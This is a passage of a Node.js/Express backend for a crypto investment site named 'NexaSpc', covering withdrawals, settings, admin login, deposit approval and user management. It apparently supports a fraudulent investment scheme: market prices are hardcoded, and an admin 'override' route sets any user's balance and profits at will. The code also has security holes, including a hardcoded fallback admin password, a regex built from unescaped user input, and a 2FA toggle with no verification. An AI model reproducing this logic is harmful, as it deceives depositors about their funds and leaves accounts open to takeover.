    `).catch(err => console.warn('[WITHDRAW] Failed to send email:', err.message));

    return res.json({
      success: true,
      transaction: tx,
      walletBalance: user.walletBalance,
      profits: user.profits
    });
  } catch (err) {
    console.error("❌ Error in /api/withdraw:", err);
    return res.status(500).json({ error: 'Failed to process withdrawal.' });
  }
});


// ─── TRANSACTIONS ─────────────────────────────────────────────
app.get('/api/transactions', authMiddleware, async (req, res) => {
  try {
    const cleanEmail = req.user.email.toLowerCase().trim();
    const txs = await Transaction.find({ userEmail: cleanEmail }).sort({ createdAt: -1 });
    return res.json({ success: true, transactions: txs });
  } catch (err) {
    console.error("Error fetching transactions:", err);
    return res.status(500).json({ error: 'Failed to fetch transactions.' });
  }
});


// ─── MARKETS ──────────────────────────────────────────────────
app.get('/api/markets', (req, res) => res.json([
  { symbol: 'BTC/USDT',  price: 67842.50, change:  2.34, volume: '24.5B' },
  { symbol: 'ETH/USDT',  price:  3521.20, change:  1.87, volume: '12.1B' },
  { symbol: 'SOL/USDT',  price:   185.40, change: -0.92, volume:  '3.2B' },
  { symbol: 'XRP/USDT',  price:    0.6234,change:  3.15, volume:  '2.8B' },
  { symbol: 'BNB/USDT',  price:   412.80, change:  0.54, volume:  '1.9B' },
  { symbol: 'ADA/USDT',  price:    0.4821,change: -1.23, volume:  '890M' },
  { symbol: 'DOGE/USDT', price:    0.1543,change:  5.62, volume:  '1.1B' },
  { symbol: 'AVAX/USDT', price:    38.92, change: -2.11, volume:  '654M' }
]));


// ─── SETTINGS ─────────────────────────────────────────────────
app.put('/api/settings/profile', authMiddleware, async (req, res) => {
  try {
    const { username, phone, country } = req.body;
    const cleanEmail = req.user.email.toLowerCase().trim();

    const user = await User.findOne({ email: cleanEmail });
    if (!user) return res.status(404).json({ error: 'User not found.' });

    if (username) user.username = username;
    if (phone !== undefined) user.phone = phone;
    if (country !== undefined) user.country = country;

    await user.save();
    pushNotif(cleanEmail, 'settings', 'Profile information updated.');

    return res.json({
      success: true,
      username: user.username,
      phone: user.phone,
      country: user.country
    });
  } catch (err) {
    console.error("Error updating profile settings:", err);
    return res.status(500).json({ error: 'Failed to update profile settings.' });
  }
});

app.put('/api/settings/password', authMiddleware, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;
    const cleanEmail = req.user.email.toLowerCase().trim();

    const user = await User.findOne({ email: cleanEmail });
    if (!user) return res.status(404).json({ error: 'User not found.' });

    const match = await bcrypt.compare(currentPassword, user.password);
    if (!match) return res.status(400).json({ error: 'Current password is incorrect.' });
    if (!newPassword || newPassword.length < 8) {
      return res.status(400).json({ error: 'New password must be at least 8 characters long.' });
    }

    user.password = await bcrypt.hash(newPassword, 10);
    await user.save();

    pushNotif(cleanEmail, 'security', 'Password changed successfully.');

    sendEmail(cleanEmail, '🔑 NexaSpc Password Changed', `
      <div style="font-family:sans-serif;background:#0a0e1a;color:#e2e8f0;padding:2rem;border-radius:12px;max-width:500px;margin:auto">
        <h2 style="color:#00d4ff">Password Changed</h2>
        <p>Your NexaSpc password was just changed. If this wasn't you, contact support immediately.</p>
      </div>
    `).catch(err => console.warn('[SETTINGS] Password email error:', err.message));

    return res.json({ success: true });
  } catch (err) {
    console.error("Error changing password:", err);
    return res.status(500).json({ error: 'Failed to change password.' });
  }
});

app.put('/api/settings/2fa', authMiddleware, async (req, res) => {
  try {
    const cleanEmail = req.user.email.toLowerCase().trim();
    const user = await User.findOne({ email: cleanEmail });
    if (!user) return res.status(404).json({ error: 'User not found.' });

    user.twoFAEnabled = !user.twoFAEnabled;
    await user.save();

    pushNotif(cleanEmail, 'security', `2FA ${user.twoFAEnabled ? 'enabled' : 'disabled'}.`);
    return res.json({ success: true, twoFAEnabled: user.twoFAEnabled });
  } catch (err) {
    console.error("Error updating 2FA:", err);
    return res.status(500).json({ error: 'Failed to toggle 2FA.' });
  }
});

app.put('/api/settings/notifications', authMiddleware, async (req, res) => {
  try {
    const cleanEmail = req.user.email.toLowerCase().trim();
    const user = await User.findOne({ email: cleanEmail });
    if (!user) return res.status(404).json({ error: 'User not found.' });

    user.emailNotifications = !user.emailNotifications;
    await user.save();

    return res.json({ success: true, emailNotifications: user.emailNotifications });
  } catch (err) {
    console.error("Error updating notification preferences:", err);
    return res.status(500).json({ error: 'Failed to update preferences.' });
  }
});
 
// ══════════════════════════════════════════════════════════════
// ADMIN AUTHENTICATION
// ══════════════════════════════════════════════════════════════
app.post('/api/admin/login', (req, res) => {
  try {
    const { password } = req.body;
    const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'ADMIN_PASSWORD_KEY';

    if (!password || password !== ADMIN_PASSWORD) {
      return res.status(401).json({ error: 'Incorrect admin credentials.' });
    }

    const token = jwt.sign({ role: 'admin' }, ADMIN_SECRET, { expiresIn: '12h' });
    return res.json({ success: true, token });
  } catch (err) {
    console.error("❌ Admin login error:", err);
    return res.status(500).json({ error: 'Server error during authentication.' });
  }
});

// ══════════════════════════════════════════════════════════════
// ADMIN USER MANAGEMENT ENDPOINTS
// ══════════════════════════════════════════════════════════════

// 1. GET ALL USERS DIRECTORY
app.get('/api/admin/users', adminMiddleware, async (req, res) => {
  try {
    const mongoUsers = await User.find({}, '-password').sort({ createdAt: -1 }).lean();
    console.log(`[ADMIN DIRECTORY] Found ${mongoUsers.length} users in MongoDB.`);

    return res.status(200).json({
      success: true,
      count: mongoUsers.length,
      users: mongoUsers
    });
  } catch (err) {
    console.error('❌ Error fetching admin user directory:', err);
    return res.status(500).json({ error: 'Failed to retrieve users directory.' });
  }
});

// 2. GET SINGLE USER DETAILS (FROM MONGO DB)
app.get('/api/admin/users/:email', adminMiddleware, async (req, res) => {
  try {
    const cleanEmail = decodeURIComponent(req.params.email).toLowerCase().trim();
    
    const user = await User.findOne({ email: cleanEmail }, '-password').lean();
    if (!user) return res.status(404).json({ error: 'User not found' });

    const userTxs = await Transaction.find({ userEmail: cleanEmail }).sort({ createdAt: -1 }).lean();
    const userWallets = connectedWallets[cleanEmail] || [];
    const userNotifs = notifications[cleanEmail] || [];

    return res.json({
      success: true,
      user: {
        ...user,
        transactions: userTxs,
        notifications: userNotifs,
        connectedWallets: userWallets
      }
    });
  } catch (err) {
    console.error('❌ Error fetching single user details:', err);
    return res.status(500).json({ error: 'Failed to fetch user details.' });
  }
});

// 3. UNIFIED METRIC & PROFILE OVERRIDE
const handleUserOverride = async (req, res) => {
  try {
    console.log("📥 Admin Update Request:", req.body);

    const { 
      userId, 
      email, 
      targetEmail, 
      username, 
      walletBalance, 
      bonuses, 
      deposits, 
      profits, 
      resetHoldings 
    } = req.body;

    const cleanUserId = (userId && typeof userId === 'string' && userId.trim() !== "") ? userId.trim() : null;
    const cleanEmail = (email || targetEmail || "").toString().trim().toLowerCase();

    if (!cleanUserId && !cleanEmail) {
      return res.status(400).json({ error: 'User ID or Email is required.' });
    }

    let user = null;
    if (cleanUserId) {
      user = await User.findById(cleanUserId);
    } 
    
    if (!user && cleanEmail) {
      user = await User.findOne({ email: { $regex: new RegExp(`^${cleanEmail}$`, 'i') } });
    }

    if (!user) {
      return res.status(404).json({ error: `User not found for identifier: ${cleanEmail || cleanUserId}` });
    }

    const applyNum = (val) => (val !== undefined && val !== null && !isNaN(Number(val)) ? Number(val) : null);

    const newBalance = applyNum(walletBalance);
    const newBonuses = applyNum(bonuses);
    const newDeposits = applyNum(deposits);
    const newProfits = applyNum(profits);

    if (username !== undefined && username !== null) user.username = username;
    if (newBalance !== null) user.walletBalance = newBalance;
    if (newBonuses !== null) user.bonuses = newBonuses;
    if (newDeposits !== null) user.deposits = newDeposits;
    if (newProfits !== null) user.profits = newProfits;

    if (resetHoldings) user.holdings = [];

    await user.save();

    console.log(`✅ [ADMIN OVERRIDE] Updated metrics for user ${user.email}`);

    const userObj = user.toObject();
    delete userObj.password;

    return res.status(200).json({
      success: true,
      message: 'User updated successfully!',
      user: userObj
    });
  } catch (err) {
    console.error('❌ Error updating user values:', err);
    return res.status(500).json({ error: 'Server error updating user values.' });
  }
};

app.post('/api/admin/users/update', adminMiddleware, handleUserOverride);
app.post('/api/admin/update-user', adminMiddleware, handleUserOverride);

// ══════════════════════════════════════════════════════════════
// DEPOSIT APPROVAL & MANAGEMENT
// ══════════════════════════════════════════════════════════════

// 1. GET ALL PENDING DEPOSITS
app.get('/api/admin/pending-deposits', adminMiddleware, async (req, res) => {
  try {
    const pendingDeposits = await Transaction.find({ 
      type: 'deposit', 
      status: 'pending' 
    }).sort({ createdAt: -1 }).lean();

    return res.status(200).json({
      success: true,
      deposits: pendingDeposits
    });
  } catch (err) {
    console.error("❌ Error fetching pending deposits:", err);
    return res.status(500).json({ error: "Failed to fetch pending deposits." });
  }
});

// 2. APPROVE DEPOSIT
app.post('/api/admin/approve-deposit', adminMiddleware, async (req, res) => {
  try {
    const { depositId } = req.body;

    if (!depositId) {
      return res.status(400).json({ error: 'Deposit ID is required.' });
    }

    const tx = await Transaction.findById(depositId);
    if (!tx) {
      return res.status(404).json({ error: 'Transaction record not found.' });
    }

    if (tx.status !== 'pending') {
      return res.status(400).json({ error: `Transaction is already ${tx.status}.` });
    }

    tx.status = 'completed';
    tx.updatedAt = new Date();
    await tx.save();

    // Credit user's wallet metrics
    await creditUserDeposit(tx.userId, tx.coin, tx.amount);

    const updatedUser = await User.findById(tx.userId);

    pushNotif(tx.userEmail, 'deposit', `Your deposit of $${tx.amount.toFixed(2)} (${tx.coin}) has been approved.`);

    console.log(`✅ Admin approved $${tx.amount} (${tx.coin}) for ${tx.userEmail}`);

    return res.status(200).json({
      success: true,
      message: `Successfully credited $${tx.amount} to ${tx.userEmail}`,
      userEmail: tx.userEmail,
      amount: tx.amount,
      updatedBalance: updatedUser ? updatedUser.walletBalance : 0
    });
  } catch (err) {
    console.error("❌ Error approving deposit:", err);
    return res.status(500).json({ error: "Server error approving deposit." });
  }
});

// 3. REJECT DEPOSIT
app.post('/api/admin/reject-deposit', adminMiddleware, async (req, res) => {
  try {
    const { depositId } = req.body;

    if (!depositId) {
      return res.status(400).json({ error: 'Deposit ID is required.' });
    }

    const tx = await Transaction.findById(depositId);
    if (!tx) {
      return res.status(404).json({ error: 'Transaction record not found.' });
    }

    if (tx.status !== 'pending') {
      return res.status(400).json({ error: `Transaction is already ${tx.status}.` });
    }

    tx.status = 'rejected';
    tx.updatedAt = new Date();
    await tx.save();

    pushNotif(tx.userEmail, 'deposit', `Your deposit request of $${tx.amount.toFixed(2)} (${tx.coin}) was rejected.`);

    console.log(`❌ Admin rejected deposit for ${tx.userEmail}`);

    return res.status(200).json({
      success: true,
      message: `Deposit rejected for ${tx.userEmail}`
    });
  } catch (err) {
    console.error("❌ Error rejecting deposit:", err);
    return res.status(500).json({ error: "Server error rejecting deposit." });
  }
});

// ══════════════════════════════════════════════════════════════
// ADMIN LOGS & WALLETS
// ══════════════════════════════════════════════════════════════
app.get('/api/admin/wallets', adminMiddleware, (req, res) => {
  const allWallets = [];
  for (const [email, wallets] of Object.entries(connectedWallets)) {
    wallets.forEach(w => allWallets.push({ ...w, userEmail: email }));
  }
  return res.json({ success: true, wallets: allWallets });
});

app.get('/api/admin/log', adminMiddleware, (req, res) => {
  return res.json({ success: true, logs: typeof adminLog !== 'undefined' ? adminLog.slice(0, 200) : [] });
});

// ══════════════════════════════════════════════════════════════
// STATIC FILE SERVING & APP LAUNCH
// ══════════════════════════════════════════════════════════════
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, '../public/admin.html')));
app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../public/index.html')));

app.listen(PORT, () => {
  console.log(`\n🚀 NexaSpc Platform → http://localhost:${PORT}`);
  console.log(`🛡️ Admin Console → http://localhost:${PORT}/admin\n`);
});